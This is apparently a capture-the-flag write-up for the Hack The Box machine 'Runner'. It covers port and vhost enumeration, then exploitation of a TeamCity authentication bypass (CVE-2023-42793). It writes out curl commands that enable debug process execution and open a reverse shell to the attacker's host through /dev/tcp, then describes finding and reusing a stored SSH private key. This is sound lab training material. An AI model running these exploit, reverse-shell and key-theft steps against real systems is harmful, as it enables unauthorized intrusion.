IP=`10.10.11.13`

## Enumeration
**nmap**
Inital scan:
```bash
❯ nmap -p- --min-rate 10000 -Pn $IP
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-26 12:33 EDT
Nmap scan report for 10.10.11.13
Host is up (0.057s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8000/tcp open  http-alt
```

Diving a bit deeper...
```bash
sudo nmap -p22,80,8000 -A -sCV -sT -Pn $IP
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)

80/tcp   open  http        nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://runner.htb/

8000/tcp open  nagios-nsca Nagios NSCA
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 5.0 (96%), Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using proto 1/icmp)
HOP RTT      ADDRESS
1   41.38 ms 10.10.14.1
2   42.96 ms 10.10.11.13
```
Domains found: `runner.htb`
Adding this to `/etc/hosts`:
```bash
echo $IP 'runner.htb' | sudo tee -a /etc/hosts
```

Also in the scan is `Nagios NSCA`. NSCA is a Nagios service that allows you to check results from remote machines and applications with Nagios. The results are received and submittedd to nagios as Passive checks. 
- [Nagios - Github](https://github.com/NagiosEnterprises/nsca)
Addon that allows you to send service check results to a central monitoring server running Nagios in a secure manner.

At this point I ran some `vhost` enumeration using `wfuzz`.

```bash
wfuzz -c -w /usr/share/seclists/Discovery/DNS/namelist.txt --hc 400,404,403 -H "Host: FUZZ.runner.htb" -u http://runner.htb -t 100 --hh 154
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://runner.htb/
Total requests: 151265

=====================================================================
ID           Response   Lines    Word       Chars       Payload           
=====================================================================

000131574:   401        1 L      9 W        66 Ch       "teamcity"        

Total time: 0
Processed Requests: 151265
Filtered Requests: 151264
Requests/sec.: 0
```
- **`-c`**: This enables colored output, making the results easier to read by highlighting different parts with various colors.
- **`-w /usr/share/seclists/Discovery/DNS/namelist.txt`**: This specifies the wordlist to use for fuzzing. In this case, it's using a wordlist located at `/usr/share/seclists/Discovery/DNS/namelist.txt`, which is typically a list of common names used in DNS subdomain enumeration.
- **`--hc 400,404,403`**: This flag tells `wfuzz` to hide (not show) responses that return HTTP status codes 400 (Bad Request), 404 (Not Found), and 403 (Forbidden). Essentially, it filters out these commonly uninformative responses to focus on more interesting or unusual results.
- **`-H "Host: FUZZ.runner.htb"`**: This flag is used to modify the HTTP header for the requests. Here, the `Host` header is being fuzzed with entries from the provided wordlist. This technique is often used in testing virtual host configurations to discover hosts configured on the server that aren't linked or directly accessible via DNS. `"FUZZ"` is replaced by each entry in the wordlist during the fuzzing process.
- **`-u http://runner.htb`**: This sets the base URL for the fuzzing. All requests will be directed to this URL, but with the modifications specified in other options (like the `Host` header).
- **`-t 100`**: This option sets the number of concurrent connections to 100. Using multiple threads allows `wfuzz` to perform requests in parallel, significantly speeding up the fuzzing process.
- **`--hh 154`**: This hides responses with exactly 154 characters in the HTTP response body. It's a way to filter out responses that are likely to be error pages or other generic responses that are of a uniform size, which often don't provide useful information.

I then added `teamcity.runner.htb` to `/etc/hosts`.

Checking the new domain on the browser presents a JetBrains Teamcity Server instance 

![[Pasted image 20240426132637.png]]

From above we can note that it is `Version 2023.05.3 (build 129390)`
https://blog.jetbrains.com/teamcity/2023/08/teamcity-2023-05-3-is-here/
```bash
searchsploit teamcity    
------------------------------------------------- ---------------------------------
 Exploit Title                                   |  Path
------------------------------------------------- ---------------------------------
JetBrains TeamCity 2018.2.4 - Remote Code Execut | java/remote/47891.txt
JetBrains TeamCity 2023.05.3 - Remote Code Execu | java/remote/51884.py
```

- [CVE-2023-42793 - RCE/Authentication Bypass vulnerability](https://blog.jetbrains.com/teamcity/2023/10/cve-2023-42793-vulnerability-in-teamcity-update/)
- [51884.py](https://www.exploit-db.com/exploits/51884)

![[Pasted image 20240426133027.png]]

After a bit more research while looking for a way to get code execution and get a foothold on the machine, I am across another CVE for version `2023.05.03`.
[CVE-2023-42793](https://www.prio-n.com/blog/cve-2023-42793-attacking-defending-JetBrains-TeamCity)

To execute this RCE, we first need to enable the debug permissions to do so:

![[Pasted image 20240426142411.png]]
`curl -s -X POST "http://teamcity.runner.htb/app/rest/debug/processes?=exePath=id" `

```bash
curl -XPOST "http://teamcity.runner.htb/admin/dataDir.html?action=edit&fileName=config/internal.properties&content=rest.debug.processes.enable=true" -H "Authorization: Bearer eyJ0eXAiOiAiVENWMiJ9.cmFmTWswcUJZVzQtZ1VuWVBQemNHZGZGR0w4.MWYzNTE5MmQtMDZjOC00ZTA3LTlkNWItYmNhOTJkYTNkNTM4" -H "Content-Type: text/plain"
```
`rest.debug.processes.enable=true` is the key thing to note from above.

Now, according to the blog post we should be able to gain command execution and get a reverse shell as follows:

```bash
curl -XPOST "http://teamcity.runner.htb/app/rest/debug/processes?exePath=/bin/bash&params=-c&params=sh+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.14.36%2F7777+0%3E%261" -H "Authorization: Bearer $TOKEN" -H "Content-Type: text/plain"
```

After starting a listener using `netcat`, and running the `curl` command we get a shell!

![[Pasted image 20240426150007.png]]

From here, when landing on a machine; I always like to run `linpeas.sh`, and look for any possible SSH keys that can be used for further lateral movement.

```bash
find / -name "id_rsa" -name ".ssh" "id_ed25519" -exec realpath {} \; 2>/dev/null
```

```bash
tcuser@647a82f29ca0:~$ find / -name "id_rsa" 2>/dev/null
find / -name "id_rsa" 2>/dev/null
/data/teamcity_server/datadir/config/projects/AllProjects/pluginData/ssh_keys/id_rsa
```

After finding the RSA SSH key, I tried SSH'ing into the machine using `admin` and `tcuser`, however I had no luck so I went back to the web interface in which I was logged in as the admin from using the CVE to get unauthenticated admin access with a new user. Here, I was able to find some users at `/admin/admin.html?item=users`
**Users:**`john`, `matthew`, `admin`

After changing the permissions on the private key with `chmod 700 id_rsa` I was able to successfully login as the user `john`. 

Now, now that we are past the docker container we can upload `linpeas.sh` and begin with our local enumeration for privilege escalation vectors.

###### To Be Continued...